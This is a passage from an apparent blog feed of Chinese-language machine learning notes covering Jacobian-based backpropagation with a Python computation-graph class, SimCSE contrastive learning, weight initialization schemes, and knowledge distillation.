            <tag> topic model </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Jacobi BP整理</title>
      <link href="/posts/ff0063e5.html"/>
      <url>/posts/ff0063e5.html</url>
      
        <content type="html"><![CDATA[<h2><span id="1-方向导数">1 方向导数</span></h2><p>在自变量空间的某个位置<span class="math inline">\(w\)</span>处，选择一个方向<span class="math inline">\(d\)</span>（单位向量），在该方向的倒数为： <span class="math display">\[\nabla_df(\mathbf{w})=\lim_{\alpha \to 0}\frac{f(\mathbf{w}+\alpha\mathbf{d}) - f(\mathbf{w})}{\alpha}\]</span> <span class="math inline">\(\alpha\)</span>趋于0时，<span class="math inline">\(\alpha\mathbf{d}\)</span>也趋于0，平均变化率变为瞬时变化率，即导数数。 <span class="math display">\[\nabla_df(\mathbf{w})=\lim_{\alpha \mathbf{d} \to0}\frac{f(\mathbf{w}+\alpha \mathbf{d}) - f(\mathbf{w})}{\alpha\mathbf{d}}\]</span> 方向导数就是多元函数在某位置，沿着某方向的瞬时变化率。</p><p>优化目标函数（最小化为例），就是要找到方向导数为负数且最小的方向，函数值在此方向下降最快。</p><p>下面就是使用梯度，快速找到方向导数为负数且最小的方向。</p><p>多元函数，分别优化每一个元，每个变量单独分析其偏导数。因为运动方向可以分解为多个分量的和。偏导数形式下的多元函数的函数值变化写成（二元为例）：<span class="math display">\[\Delta f=\frac{\partial f}{\partial w_1}\Delta w_1 + \frac{\partialf}{\partial w_2}\Delta w_2\]</span> 运动的距离（二维）变为： <span class="math display">\[\sqrt {(\Delta w_1)^2 + (\Delta w_2)^2}\]</span> 那么，函数值在运动方向上的偏导数就是： <span class="math display">\[\frac {\frac{\partial f}{\partial w_1}\Delta w_1 + \frac{\partialf}{\partial w_2}\Delta w_2}{\sqrt {(\Delta w_1)^2 + (\Delta w_2)^2}} =\begin{pmatrix} \frac{\partial f}{\partial w_1}, \frac{\partialf}{\partial w_2} \end{pmatrix} \begin{pmatrix} \frac{\Delta w_1}{\sqrt{(\Delta w_1)^2 + (\Delta w_2)^2}} \\ \frac{\Delta w_2}{\sqrt {(\Deltaw_1)^2 + (\Delta w_2)^2}} \end{pmatrix}\]</span> 其中第一个向量就是函数在<span class="math inline">\(\mathbf{w}\)</span>处的梯度，第二个向量就是<span class="math inline">\(\Delta\mathbf{w}\)</span>的变化方向上的单位向量。</p><p>所以，多元函数的方向导数，就是该位置梯度与自变量变化方向向量的内积。也即，梯度向量在自变量变化方向向量上的投影。</p><p>那么，最优的最小化方向为，<span class="math inline">\(cos(\theta)\)</span>为-1的自变量变化方向。即自变量变化为负梯度方向。</p><p>垂直于梯度方向时，函数值不变化。</p><p>当然梯度下降，需要设置一个较小的学习率，因为，梯度反映的是函数瞬时的变化率，只保证在当前位置的较小领域内的变化规律。</p><h2><span id="2-jacobi">2 Jacobi</span></h2><p>有n维向量 <span class="math inline">\(\mathbf{w}\)</span>，经过一层网络，得到 m 维 <span class="math inline">\(f(\mathbf w)\)</span>。 <span class="math display">\[\mathbf f(\mathbf w)=\begin{pmatrix} f_1(\mathbf w) \\ f_2(\mathbf w) \\... \\ f_m(\mathbf w) \end{pmatrix}\]</span> 每一维为一个标量函数，可以对 n维向量 <span class="math inline">\(\mathbf{w}\)</span>进行求偏导操作，求得梯度。得到<span class="math display">\[\begin{bmatrix} \frac{\partial f_1}{\partial w_1} &amp; ... &amp;\frac{\partial f_1}{\partial w_n} \\ ... &amp; ... &amp; ... \\\frac{\partial f_m}{\partial w_1} &amp; ... &amp; \frac{\partialf_m}{\partial w_n} \end{bmatrix}\]</span> 这就是函数在 <span class="math inline">\(\mathbf{w}\)</span>处的Jacobi matrix。每一行是 <span class="math inline">\(\mathbff(\mathbf w)\)</span>的分量在<span class="math inline">\(\mathbf{w}\)</span> 处的梯度向量。</p><p>线性近似（理解为函数在某一位置处的一阶泰勒展开并忽略高阶无穷小）的误差，是自变量变化值趋于0时，相对自变量变化值的高阶无穷小。也就是说，线性近似是用一个高阶的函数来近似低阶的原函数，而其误差可以趋于无穷小。</p><p>在多元函数中，近似关系可写为： <span class="math display">\[\mathbf f(\mathbf w) \approx \mathbf f(\mathbf w^*) + \mathbfJ_f(\mathbf w) \cdot (\mathbf w - \mathbf w^*)\]</span> Jacobimatrix每一行是原函数一个分量的梯度，每一维分量的近似组合成了对原函数整体的近似。</p><h2><span id="3-back-propagation-withjacobi">3 Back propagation withJacobi</span></h2><p>计算图中，一对父子节点就是一个多对多的映射，都可以求一个Jacobimatrix。</p><p>在chain rule之下，一个复合映射的Jacobi是容易求的。 <span class="math display">\[f(g(h(\mathbf w)))\]</span> 其Jacobi表示为 <span class="math inline">\(\mathbfJ_f(g(h(\mathbf w))) \cdot \mathbf J_g(h(\mathbf w)) \cdot \mathbfJ_h(\mathbf w)\)</span>。其中输入输出维度是相对应的。</p><p>计算图中，每个节点将结果通过，对自己的Jacobi（单位矩阵）乘上对父节点的Jacobi，将信息传递给上一层。</p><p>那么最终结果对一个节点的Jacobi，可以计算： <span class="math display">\[\mathbf J_f = \sum_s \mathbf J_{rs} \mathbf J_{sf}\]</span> <span class="math inline">\(\mathbfJ_{rs}\)</span>是最终结果对s节点的Jacobi（表示累计误差BP到s的梯度），<span class="math inline">\(\mathbfJ_{sf}\)</span>是节点s对f节点的Jacobi。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Node</span><span class="hljs-params">(object)</span>:</span><br>    <span class="hljs-string">"""</span><br><span class="hljs-string">    计算图节点基类</span><br><span class="hljs-string">    """</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span><span class="hljs-params">(self, *parents, **kargs)</span>:</span><br>        self.kargs = kargs<br>        self.graph = kargs.get(<span class="hljs-string">'graph'</span>, default_graph)<br>        self.need_save = kargs.get(<span class="hljs-string">'need_save'</span>, <span class="hljs-literal">True</span>)<br><br>        self.parents = list(parents)  <span class="hljs-comment"># 父节点列表</span><br>        self.children = []  <span class="hljs-comment"># 子节点列表</span><br>        self.value = <span class="hljs-literal">None</span>  <span class="hljs-comment"># 本节点的值</span><br>        self.jacobi = <span class="hljs-literal">None</span>  <span class="hljs-comment"># 结果节点对本节点的雅可比矩阵</span><br><br>        <span class="hljs-comment"># 将本节点添加到父节点的子节点列表中</span><br>        <span class="hljs-keyword">for</span> parent <span class="hljs-keyword">in</span> self.parents:<br>            parent.children.append(self)<br><br>        <span class="hljs-comment"># 将本节点添加到计算图中</span><br>        self.graph.add_node(self)<br>    <br>    ...<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">forward</span><span class="hljs-params">(self)</span>:</span><br>        <span class="hljs-string">"""</span><br><span class="hljs-string">        前向传播计算本节点的值，若父节点的值未被计算，则递归调用父节点的forward方法</span><br><span class="hljs-string">        """</span><br>        <span class="hljs-keyword">for</span> node <span class="hljs-keyword">in</span> self.parents:<br>            <span class="hljs-keyword">if</span> node.value <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                node.forward()<br><br>        self.compute()<br>        <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backward</span><span class="hljs-params">(self, result)</span>:</span><br>        <span class="hljs-string">"""</span><br><span class="hljs-string">        反向传播，计算结果节点对本节点的雅可比矩阵</span><br><span class="hljs-string">        """</span><br>        <span class="hljs-keyword">if</span> self.jacobi <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">if</span> self <span class="hljs-keyword">is</span> result:  <span class="hljs-comment"># 对自己的Jacobi</span><br>                <span class="hljs-comment"># self.dimension()表示节点值向量的维度</span><br>                self.jacobi = np.mat(np.eye(self.dimension()))<br>            <span class="hljs-keyword">else</span>:<br>                self.jacobi = np.mat(<br>                    np.zeros((result.dimension(), self.dimension())))<br><br>                <span class="hljs-keyword">for</span> child <span class="hljs-keyword">in</span> self.get_children():<br>                    <span class="hljs-keyword">if</span> child.value <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:  <span class="hljs-comment"># 为None时，表示不在当前计算路径上</span><br>                        <span class="hljs-comment"># 即为上文中的计算公式 10</span><br>                        self.jacobi += child.backward(result) * child.get_jacobi(self)<br><br>        <span class="hljs-keyword">return</span> self.jacobi<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dimension</span><span class="hljs-params">(self)</span>:</span><br>        <span class="hljs-string">"""</span><br><span class="hljs-string">        返回本节点的值展平成向量后的维数</span><br><span class="hljs-string">        """</span><br>        <span class="hljs-keyword">return</span> self.value.shape[<span class="hljs-number">0</span>] * self.value.shape[<span class="hljs-number">1</span>]<br>    <br>    ...<br></code></pre></div></td></tr></table></figure><p>调用结果节点forworad，得到所有value属性，缓存在每个节点。调用某个节点backworad，将计算该节点的梯度保存在jacobi属性（梯度的转置，若规定梯度为列向量）中。</p><p>同时，实现Jacobi的乘法关系下的计算，可以进行推导。过程比较繁琐但是不难，直接写结果了：</p><p>矩阵 <span class="math inline">\(\mathbf C=\mathbf A \mathbfB\)</span>，A为(m,n)维，B为(n,k)维。将三个矩阵全部展开，拼接为一个列向量。</p><p>那么C对A的Jacobi为（mk, mn） <span class="math display">\[\begin{bmatrix} B^T &amp; 0 &amp; ... &amp; 0 \\ 0 &amp; B^T &amp; ...&amp; 0 \\ ... &amp; ... &amp; ... &amp; ... \\ 0 &amp; 0 &amp; ...&amp; B^T \end{bmatrix}\]</span> C对B的Jacobi为（mk, nk）的 <span class="math display">\[\begin{bmatrix} diagonal(a_{1,1}) &amp; diagonal(a_{1,2}) &amp; ...&amp; diagonal(a_{1,n}) \\ diagonal(a_{2,1}) &amp; diagonal(a_{2,2})&amp; ... &amp; diagonal(a_{2,n}) \\ ... &amp; ... &amp; ... &amp; ...\\ diagonal(a_{m,1}) &amp; diagonal(a_{m,2}) &amp; ... &amp;diagonal(a_{m,n}) \end{bmatrix}\]</span></p><p>到此，基于Jacobi的BP计算方式，就基本没有问题了。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BP </tag>
            
            <tag> deep learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SimCSE-文本对比学习</title>
      <link href="/posts/9e098b96.html"/>
      <url>/posts/9e098b96.html</url>
      
        <content type="html"><![CDATA[<p>文本对比学习不同于图像的一点，就是增广方式。文本随机删除、乱序、替换，好像都可以，但是有没有道理，效果能有多大提升，都不那么清楚。这方面也没有比较公认处理方法流程。</p><p><a href="https://arxiv.org/abs/2104.08821" target="_blank" rel="noopener">论文 SimCSE</a> (<a href="https://github.com/princeton-nlp/SimCSE">Git</a>)，提出一种简单的对比学习方法，直接在BERT类模型之上，使用设计的对比学习损失进行finetune，取得了比较好的效果。</p><h2><span id="方法">方法</span></h2><p>首先在图像领域使用的对比学习损失公式是</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/SimCSE-文本对比学习_pic/image-20210615172437033.png" srcset="/img/loading.gif" lazyload alt style="zoom:65%;"></p><p>本文提出的方法，不使用文本增广生成对比样本，而是通过随机Dropout模型的intermediaterepresentations，得到一组不同mask下的对比学习样例，作为正样本。而不是来自同一个原文本的intermediate representations 组成多组负样本。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/SimCSE-文本对比学习_pic/image-20210615172947576.png" srcset="/img/loading.gif" lazyload alt style="zoom:95%;"></p><p>两个绿圈正是不同dropout下的一组正样本。思路确实挺简单的，但是别人做出来了，还整理得有条理。唉，我又搞得了什么鬼贡献呢。</p><p>论文结果，在取0.1 dropoutrate时，无监督句子向量的效果最好。STS-B任务的Spearman`s correlation 达到79.1。</p><p>论文还在有监督条件下，进程了实验。在NLI数据集上，加入两个源文本同义(entailment)、中立(neutral)、反义(contradiction)三种情况的监督信息。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/SimCSE-文本对比学习_pic/image-20210615173813801.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>正例来自同义的句子对，负例来自不同含义的句子。同时使用严格反义的句子对作为负例时，效果会有提升。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/SimCSE-文本对比学习_pic/image-20210615174705133.png" srcset="/img/loading.gif" lazyload alt style="zoom:95%;"></p><p>这里没有使用不同dropout，毕竟已经有正负样本标签了。作者也做了实验，使用dropout增广并没有带来提升。</p><h3><span id="对比学习效果评价">对比学习效果评价</span></h3><p>在看BertFlow时，了解到向量表示的各向异性很重要，尤其在语义相似性任务中，对相似性指标影响很大。另外，直觉来讲，对比学习目的就是将同类相似的聚在一起，同时将向量分布尽量保持均匀，以保留更可能多的信息。</p><p>好的学习效果，应该保证 结果的对齐性和均匀性(Alignment anduniformity)。<a href="https://arxiv.org/abs/2005.10242">原论文</a>推导较多，结论就是，对比学习的损失，可以转换为对齐损失和均匀损失之和。过程挺复杂的，这里并不关心(挺麻烦的)。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/SimCSE-文本对比学习_pic/image-20210615210108744.png" srcset="/img/loading.gif" lazyload alt style="zoom:70%;"></p><p>论文给出了代码：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/SimCSE-文本对比学习_pic/image-20210615210324110.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>注意，以上计算中的x和y都是经过 L2 normalize 的向量。</p><p>原论文做了很多实验，发现要同时将对齐损失和均匀损失达到最优，很难，至少在作者的实验中，是达不到的。</p><p>SimCSE中，将这两个损失，作为metrics使用，评价sentenceembedding的对比学习效果。两个指标，都是尽量小更好，但是很难保证同时最优。</p><h2><span id="经验">经验</span></h2><p>无监督句向量训练，只使用随机Dropout，得到两个representations作为正例，比在源文本上进行随机删除替换等操作的效果更好。</p><p>有监督条件下，不需要随机Dropout生成样本表达，利用监督信息就能得到很好的学习效果。</p><p>训练BERT base时，使用256或者512 batch size效果相对较好。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> NLP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sentence embedding </tag>
            
            <tag> SimCSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>回顾神经网络初始化方法</title>
      <link href="/posts/1498e8ac.html"/>
      <url>/posts/1498e8ac.html</url>
      
        <content type="html"><![CDATA[<p>那么首先我们已经知道，全0或者常数、过大、过小的权重初始化都有梯度消失或者梯度爆炸的问题。而我们所期望的初始化状态是：期望为0，方差在一定范围内，同时尽量保证不同层的权重方差的一致性。这样出现internalcovariance shift的可能性会大幅降低。闲来无事，适巧康康。</p><h2><span id="为了更简洁的期望与方差">为了更简洁的期望与方差</span></h2><p>首先需要知道期望<span class="math inline">\(E\)</span>和方差<span class="math inline">\(Var\)</span>的计算方法，基本公式： <span class="math display">\[Var(X)=E(X^2)-(E(X))^2\]</span></p><p><span class="math display">\[Covariance(X,Y)=E((X-E(X))(Y-E(Y)))\\=E(XY)-E(X)E(Y)\]</span></p><p>当X，Y为独立的随机变量，Corvariance(即Cov)为0。</p><p>可以表示出两个独立随机变量的和的方差： <span class="math display">\[Var(X+Y)=E((X+Y)^2)-(E(X+Y))^2\\=E(X^2+Y^2+2XY)-(E(X)+E(Y))^2\\=E(X^2)-(E(X))^2+E(Y^2)-(E(Y))^2\\=Var(X)+Var(Y)\]</span> 两个独立随机变量的积的方差： <span class="math display">\[Var(XY)=E((XY)^2)-(E(XY))^2\\=E(X^2)E(Y^2)-(E(X)E(Y))^2\\=(Var(X)+E(X)^2)(Var(Y)+E(Y)^2)-(E(X)E(Y))^2\\=Var(X)Var(Y)+E(X)^2Var(Y)+Var(X)E(Y)^2\]</span></p><h2><span id="神经网络计算过程一般性表达">神经网络计算过程一般性表达</span></h2><p>基本的计算方式： <span class="math display">\[Z_l=WA_{l-1}+B\\A_l=f(Z_l)\]</span> W与A是相互独立的。每一层不同神经元的权重<span class="math inline">\(w_i\)</span>是独立同分布的。</p><p>假如W与A的分布已知，那么Z的方差可以计算： <span class="math display">\[Var(z)=Var(\sum_{i}^{fan\_in} w_ia_i)\\=fan\_in \times (Var(w)Var(a)+E(w)^2Var(a)+Var(w)E(a)^2)\]</span>fan_in表示输入单元个数，每个输入单元的激活值与对应的权重相乘求和，得到当前层的激活值。独立同分布，所以和的方差可以简化为方差之和。</p><h2><span id="不同激活函数的影响">不同激活函数的影响</span></h2><p>初始化的目的始终是避免梯度爆炸或者消失，最好可以加快收敛速度。那么在分析整个网络的参数逐层变化时，需要分析一般性的变化规律。</p><p>激活值的分布，受到激活函数的形式影响，这是一个关键的因素。</p><h3><span id="对称型激活函数">对称型激活函数</span></h3><p>tanh，sigmoid等关于x轴对称的函数，可以保证激活值的期望也为0。而此时，方差的计算得到简化：<span class="math display">\[Var(Z_l)=fan\_in^{l} \times \prod_{l=1}^{L}Var(w_l) \times Var(Z_{l-1})\]</span> 同时考虑反向传播的过程，其差异在于fan_in 变为fan_out，详细过程见<a href="https://proceedings.mlr.press/v9/glorot10a/glorot10a.pdf">论文</a>。同时约束前向和反向的系数都为1，那么，可以假设权重的分布为<span class="math display">\[N(0, \frac{2}{fan\_in+fan\_out})\]</span> 若为均匀分布，可以假设 <span class="math display">\[U(-\frac{\sqrt{6}}{fan\_in+fan\_out}, \frac{\sqrt{6}}{fan\_in+fan\_out})\]</span></p><h3><span id="非对称分段激活函数">非对称分段激活函数</span></h3><p>ReLU这类激活函数，激活值的期望不再为0，公式(6)可以进行另一种变换。注意w的期望依然是我们所假设的0，这和激活值的分布是独立的。<span class="math display">\[Var(z)=fan\_in \times (Var(w)Var(a)+E(w)^2Var(a)+Var(w)E(a)^2)\\=fan\_in \times (Var(w)Var(a)+Var(w)E(a)^2)\\=fan\_in \times (Var(w)[E(a^2)-E(a)^2]+Var(w)E(a)^2)\\=fan\_in \times Var(w) \times E(a^2)\]</span> 何凯明推出： <span class="math display">\[Var(Z_l)=\frac{1}{2} \times fan\_in \times Var(w_l) \times Var(Z_{l-1})\]</span> 假设两层之间系数为1，权重可假设为分布： <span class="math display">\[N(0, \frac{2}{fan\_in})\]</span> 如果按照反向传播计算： <span class="math display">\[N(0, \frac{2}{fan\_out})\]</span> 在caffe的实现中，可以选择使用 <span class="math display">\[N(0, \frac{4}{fan\_in + fan\_out})\]</span></p><p>当然也可以不从激活函数入手，使用Normalization方法，强制变换分布。</p><h2><span id="来自神经网络训练动力学研究的一点点总结">来自神经网络训练动力学研究的一点点总结</span></h2><p>神经网络学习过程，可以从信号频域角度分析。神经网络擅长并且优先学习低频信号信息，而不擅长学习高频振荡信号。也因此，通常模型的参数学习结果是一个比较平滑的曲面（该研究主要是在浅层网络上实验）。<a href="https://arxiv.org/abs/2101.00747">论文</a>中说，如无必要，勿增频率。</p><p><a href="https://www.bilibili.com/video/BV19Q4y1X7RV">报告</a>中还展示了一种设计思路，以提高网络处理高频信号的能力，就是scale到较低的值域，以获得相对较小的参数空间。</p><p>而参数的初始化，不仅对参数的频率信息有影响，还影响着模型在不同条件下的收敛速度和收敛性（报告展示了浅层网络在MNIST实验的结果）。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/回顾神经网络初始化方法_pic/image-20210617002135477.png" srcset="/img/loading.gif" lazyload alt style="zoom:60%;"></p><p>实验也指出了多种常用初始化在该理论中，都具有较好的性能。这里的变量和公式，比较复杂，这里也只关心了结论。</p><blockquote><p><a href="https://arxiv.org/abs/2105.11686" target="_blank" rel="noopener">凝聚机制</a></p><p>大模型训练后期，参数会偏向简化参数空间，向更少的方向聚集参数梯度向量，出现趋向相同方向的权重。</p><p>所以论文的结论为，神经网络存在这小网络偏好，如无必要，勿增<strong>神经元</strong>。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> deep learning </tag>
            
            <tag> initialization </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Knowledge Distillation Note</title>
      <link href="/posts/62f6fe86.html"/>
      <url>/posts/62f6fe86.html</url>
      
        <content type="html"><![CDATA[<p>知识蒸馏模型采用类似迁移学习的方法，通过采用预先训练好的老师模型(Teachermodel）的输出作为监督信号去训练另外一个简单的学生模型(Studentmodel)。</p><p>所谓的知识就是从输入向量引至输出向量的节点图。</p><p>大概分为三类：知识蒸馏（模型压缩），跨域迁移无标签转换，集成蒸馏。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417161513300.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>此处关注知识蒸馏（模型压缩）这一类。</p><h2><span id="first-step">First Step</span></h2><p><a href="https://arxiv.org/abs/1503.02531" target="_blank" rel="noopener">原文</a>， <a href="https://arxiv.org/pdf/2004.05937">综述</a></p><p>1、训练复杂的教师模型（teacher model）：先用硬目标（hardtarget），也就是正常的标签（label）训练大模型。</p><p>2、计算软目标（soft target）：利用训练好的大模型来计算软目标（softtarget），也就是大模型预测后再经过softmax层的输出。</p><p>3、训练小模型，在小模型的基础上再加一个额外的软目标（softtarget）的损失函数，通过权重参数来调节两个损失函数的比重。</p><p>4、预测时，将训练好的小模型来进行实验。</p><blockquote><p>软目标（soft target），尽量提高复杂模型里的信息量，也就是熵。</p><p>离散的数据在等概的情况下熵值是最大的，在分类的过程中，要尽量贴近与等概率的情况，这样就可以使得软目标（softtarget）在每次训练的过程中获得更多的信息和更小的梯度方差，小模型可以用更少的数据和更小的学习率来进行训练，进一步压缩。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417160904684.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>方法分类：</p><p><strong>模型传递训练集成算法</strong>：训练学生模型，使其参数和教师模型一样，而不是压缩模型。如图，从教师训练学生1，以此由学生i训练学生i+1，最后集成所有的学生模型。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417154412740.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p><strong>交替式训练模型算法</strong>：采用多个网络同时进行训练，每个网络在训练过程中不仅接受来自真值标记的监督，还参考同伴网络的学习经验来进一步提升泛化能力。在整个过程中，两个网络之间不断分享学习经验，实现互相学习共同进步。两个网络的优化是迭代进行的，直到收敛。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417154546746.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p><strong>特征表示训练</strong>：使用回归模块来配准部分学生网络和部分教师网络的输出特征，并且对输出特征进行处理，可以将网络处理的重点放在得到相似的特征层。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417160740304.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p><strong>自注意力蒸馏算法</strong>：Self AttentionDistillation，称为SAD。对于多通道的主力意图有三种方法：1.绝对值求和；2.绝对值指数求和，指数大于1；3.绝对值指数求最大值。让浅层特征来学习高层特征的表达，从而加强网络的整体特征表达能力。这种底层特征模仿高层特征的学习过程，属于自注意力蒸馏(SelfAttention Distillation)。</p><p>此处更关注特征表示训练这一类。NLP中用的最多的一些方法也来自这一类。比如：DistilBERT学习最后一层的表示。PKDBERT（PatientKnowledgeDistillation）同时学习中间层的表示。TinyBERT将embedding层也纳入学习的范畴。同时关注新的基于对比学习的方法。</p><h2><span id="contrastiverepresentation-distillation">ContrastiveRepresentation Distillation</span></h2><p><a href="https://arxiv.org/abs/1910.10699" target="_blank" rel="noopener">论文</a>， <a href="https://github.com/HobbitLong/RepDistiller">Git</a></p><p>基本假设，知识蒸馏应该要迁移的是表征representation，而不是概率分布（不管是使用KL散度还是L2距离）。同时之前的不是基于对比学习的方法，会丢失Teacher模型输出表征representation的结构信息，即忽略了维度间有很复杂的依赖关系。</p><p>因为KL散度或者L2距离计算将每个维度认为是独立的，在表征学习中，很难保证这里的独立假设是完成成立的。</p><p>符号定义：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417162335123.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>这里 <span class="math inline">\(Z^T=W_T(T), Z^S=W_S(S)\)</span>,<span class="math inline">\(\sigma\)</span> 为 softmax 函数。</p><p>损失函数：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417162602602.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>两个H表示不同的函数，第一个表示交叉熵（标签），第二个表示KL散度（表征）。</p><h3><span id="对比学习引入">对比学习引入</span></h3><p>S和T的输入是相同的时，表征应该相似。S和T的输入是不同的时，表征应该不同。</p><p>同时衡量表征差异的方法，变为NCE，从而引入的负例，即</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417163220728.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>对比学习的目标函数为：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417163257078.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>如果只是使用该方法，那到此已经可以用了。</p><h3><span id="目标函数推导">目标函数推导</span></h3><p>假设，S和T的输入是相同时，C=1(T, S同分布)，否则C=0(T,S不同分布)。有1个相关输入对，N个无关输入对，M为数据集的大小。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417164746269.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417164759649.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>计算<span class="math inline">\(q(C=1|T,S)\)</span>:</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417165926483.png" srcset="/img/loading.gif" lazyload alt style="zoom:70%;"></p><p>取对数，同时乘上-1：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417170119212.png" srcset="/img/loading.gif" lazyload alt style="zoom:70%;"></p><p>交换 log(N) 项，两边按p(T,S)求积分：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417170250009.png" srcset="/img/loading.gif" lazyload alt style="zoom:70%;"></p><p>定义：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417171048488.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>引入NCE，不等式右边写成：</p><p>设 <span class="math inline">\(h^*(T, S)=q(C=1|T,S), h^*=argmax\L_{critic}(h)\)</span></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417170733834.png" srcset="/img/loading.gif" lazyload alt style="zoom:70%;"></p><p>由于 <span class="math inline">\(h^*\)</span>是极大值点，所以，一般性的 <span class="math inline">\(h\)</span>都有下式成立:</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417171328758.png" srcset="/img/loading.gif" lazyload alt style="zoom:60%;"></p><p>其中h为：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417163220728.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>所以方法就是先找到 T和S表征的互信息的上界，然后，优化student模型，使得互信息关于S的下界最大，得到最优的学生模型。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417163257078.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><h2><span id="softmaxregression-representation-distillation">SoftmaxRegression Representation Distillation</span></h2><p><a 